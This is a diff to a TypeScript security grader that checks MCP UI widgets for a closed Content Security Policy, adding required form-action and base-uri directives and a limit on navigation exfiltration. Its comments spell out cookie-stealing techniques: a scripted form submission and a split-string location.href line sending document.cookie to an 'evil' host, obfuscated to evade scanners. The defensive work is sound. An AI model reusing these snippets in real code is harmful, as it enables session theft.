@@ -1613,14 +1613,35 @@ function cspAdmitsRemote(csp: Record<string, unknown>): string[] {
  * media/font/object surfaces UNCONSTRAINED and is therefore NOT closed. An
  * absent or empty CSP (`undefined` / `{}`) is likewise not closed: it declares no
  * boundary for the host sandbox to enforce.
+ *
+ * (c) ALSO requires `form-action` AND `base-uri` to be PRESENT and restrictive
+ * (`'none'`/`'self'` tokens only) — same shape as the `default-src` check
+ * above, but these two directives are NOT covered by (b) at all: per the CSP
+ * spec, `form-action` and `base-uri` are the two directives that do NOT fall
+ * back to `default-src` (https://www.w3.org/TR/CSP3/, "Directives" — both are
+ * listed with "Fallback: None"). So `default-src 'none'` — however restrictive
+ * — leaves form submission and `<base href>` completely UNCONSTRAINED unless
+ * the CSP names them explicitly. A hash-pinned, exfil-scan-clean island can
+ * still `document.createElement('form')`, set `f.action` to an (obfuscated,
+ * split-string) remote origin, and `f.submit()` with `document.cookie` in a
+ * field — the whole-document navigation is a FORM SUBMISSION, not a fetch/img/
+ * media load, and no `default-src`, however restrictive, closes it. An absent
+ * OR remote/permissive `form-action`/`base-uri` is therefore NOT closed, same
+ * as an absent/permissive `default-src`.
  */
 function cspIsClosed(csp: Record<string, unknown> | undefined): boolean {
   if (!csp) return false
   if (cspAdmitsRemote(csp).length > 0) return false
-  // REQUIRED restrictive default-src: present, and every token is 'none'/'self'.
-  const defTokens = cspSourceTokens(cspDirective(csp, 'default-src')).map((t) => t.toLowerCase())
-  if (defTokens.length === 0) return false
-  return defTokens.every((t) => t === "'none'" || t === "'self'")
+  // REQUIRED restrictive directives: each must be PRESENT, and every token
+  // 'none'/'self'. default-src is the fetch-directive fallback; form-action
+  // and base-uri are the two directives that never fall back to it and so
+  // must be checked explicitly (see doc comment above).
+  for (const dir of ['default-src', 'form-action', 'base-uri']) {
+    const tokens = cspSourceTokens(cspDirective(csp, dir)).map((t) => t.toLowerCase())
+    if (tokens.length === 0) return false
+    if (!tokens.every((t) => t === "'none'" || t === "'self'")) return false
+  }
+  return true
 }
 
 // --- CSP hash-source (`'sha256-...'`) support for interactive islands ---------
@@ -1814,6 +1835,34 @@ function inlineScriptBodies(html: string): string[] {
  * of inertness; the closed CSP is the real boundary.
  * No claim ⇒ SKIP. An externalUrl widget is graded on the fetched page (or, when
  * not fetched, on the linkage check, not here).
+ *
+ * HONEST CEILING for hash-pinned INTERACTIVE islands (ax-coz): the closed CSP
+ * (default-src + form-action + base-uri all present-and-restrictive, no remote
+ * in any fetch directive, script execution hash-pinned) closes every
+ * CSP-enforceable exfil surface — fetch/XHR/beacon/image/media/font/object/
+ * worker loads, form submission, and `<base href>` rewriting. It does NOT, and
+ * CANNOT, close plain top-level navigation: `location.href = "…"`,
+ * `location.assign(...)`, `window.open(...)`, or a same-window `<a>` click to a
+ * remote URL are ordinary document navigations, and no CSP directive
+ * implemented in any shipping browser governs them — `navigate-to` was
+ * specified in CSP3 but never shipped in any engine, so it is not a boundary
+ * the grader can rely on. That means a hash-pinned island can still
+ * `location.href = "ht"+"tps://evil/c?d="+document.cookie` and no CSP the host
+ * enforces will stop the browser from making that navigation; the grader's
+ * static scan of the srcDoc can flag a LITERAL `location.href = "https://…"`
+ * assignment but is trivially defeated by string concatenation/obfuscation,
+ * exactly like the pre-CSP exfil scan was. So an interactive island — unlike a
+ * static, script-less widget, where the closed CSP genuinely IS a complete,
+ * provable boundary — carries genuine residual navigation-exfil trust that NO
+ * grader can close from the outside. The verdict below says so explicitly
+ * rather than certifying an island as equivalently airtight to a static
+ * widget; see the `[interactive: navigation-exfil not CSP-provable]` suffix on
+ * the PASS detail. Do NOT attempt to "fix" this by blocking `location`/
+ * `window.open` in the static scan as a primary defense — that only reproduces
+ * the obfuscation-defeatable deny-list this function deliberately moved away
+ * from. The closed CSP (default-src/form-action/base-uri + hash-pinning) is
+ * the real, provable boundary; this ceiling is the honest limit of what any
+ * static/CSP-based grader can prove about navigation.
  */
 function judgeMcpUiSelfContained(ui: McpUiContext): { verdict: Verdict; detail: string } {
   if (!ui.claims) return { verdict: 'skip', detail: NOT_READY }
@@ -1836,7 +1885,7 @@ function judgeMcpUiSelfContained(ui: McpUiContext): { verdict: Verdict; detail: 
     return { verdict: 'fail', detail: `_meta.ui.csp is not closed: ${cspOffenders.slice(0, 3).join('; ')} — a widget CSP that admits a wildcard or remote origin defeats the host sandbox` }
   }
   if (!cspIsClosed(csp)) {
-    return { verdict: 'fail', detail: `the widget declares no closed _meta.ui.csp (need e.g. default-src 'none' with script-src/connect-src restricted to 'self') — an un-CSP'd widget cannot be proven self-contained; the host sandbox has no policy to enforce` }
+    return { verdict: 'fail', detail: `the widget declares no closed _meta.ui.csp (need default-src 'none'/'self' AND form-action 'none'/'self' AND base-uri 'none'/'self' — form-action/base-uri do not fall back to default-src per the CSP spec, so an absent or permissive form-action/base-uri leaves form-submission / <base href> exfil unconstrained) — an un-CSP'd widget cannot be proven self-contained; the host sandbox has no policy to enforce` }
   }
   // csp is defined & closed here (cspIsClosed returns false for undefined).
   const cspObj = csp as Record<string, unknown>
@@ -1889,7 +1938,7 @@ function judgeMcpUiSelfContained(ui: McpUiContext): { verdict: Verdict; detail: 
         return { verdict: 'fail', detail: `an inline <script> is not hash-pinned: its ${cspScriptHash(body)} is absent from the effective script-src-elem hash set (${[...hashSet].join(' ')}) — under a correct host CSP it would not execute; the grader will not certify an un-pinned or hash-mismatched inline script as safe` }
       }
     }
-    return pass(`srcDoc is self-contained: ${inlineScripts.length} inline island script(s) hash-pinned in script-src, no executable external refs, behind a closed CSP`)
+    return pass(`srcDoc is self-contained: ${inlineScripts.length} inline island script(s) hash-pinned in script-src, no executable external refs, behind a closed CSP [interactive: navigation-exfil not CSP-provable]`)
   }
   return pass('srcDoc is self-contained (no executable external refs) behind a closed CSP')
 }
